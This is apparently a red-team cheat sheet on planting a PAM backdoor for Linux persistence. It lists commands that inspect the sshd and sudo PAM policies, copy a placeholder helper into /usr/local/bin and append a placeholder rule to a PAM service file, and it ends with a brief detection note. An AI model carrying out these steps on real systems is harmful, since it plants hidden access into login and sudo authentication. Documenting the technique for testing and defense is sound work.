---
technique: PAM Backdoor
category: persistence
targets: Linux
tags: linux persistence pam authentication
---

# PAM Backdoor

PAM persistence modifies authentication policy so a planted helper, module, or rule runs during login.

## Prerequisites

| Condition | Notes |
|-----------|-------|
| Root access | Required to change PAM policy or module paths |
| Tested helper | Keep helper source and compilation in a tool note |
| Targeted service | SSH, sudo, su, and login use different PAM files |

## Discovery

### PAM directory

#sh #pam #recon

List PAM service policy files.

```sh title:"List PAM policy files"
ls -la /etc/pam.d
```
<!-- cheat -->

### SSH PAM policy

#sh #pam #ssh

Review the SSH PAM policy before changing authentication behavior.

```sh title:"Print SSH PAM policy"
cat /etc/pam.d/sshd
```
<!-- cheat -->

### Sudo PAM policy

#sh #pam #sudo

Review the sudo PAM policy before changing authentication behavior.

```sh title:"Print sudo PAM policy"
cat /etc/pam.d/sudo
```
<!-- cheat -->

## Abuse

### Step 1: Install PAM helper

#sh #pam #persistence

Copy a prepared helper into a root-owned location.

```sh title:"Install PAM helper"
cp "$script_path" /usr/local/bin/pam_helper
```
<!-- cheat
var script_path
-->

### Step 2: Set helper permissions

#sh #pam #persistence

Make the PAM helper executable by root-controlled authentication paths.

```sh title:"Set PAM helper permissions"
chmod 755 /usr/local/bin/pam_helper
```
<!-- cheat -->

### Step 3: Append PAM rule

#sh #pam #persistence

Append a prepared PAM rule to the selected service policy.

```sh title:"Append PAM service rule"
printf '%s\n' "$pam_line" >> "$pam_service_file"
```
<!-- cheat
var pam_line
var pam_service_file
-->

## Detection

Watch for PAM policy changes, new files under PAM module paths, and authentication-time execution from unusual helper locations.
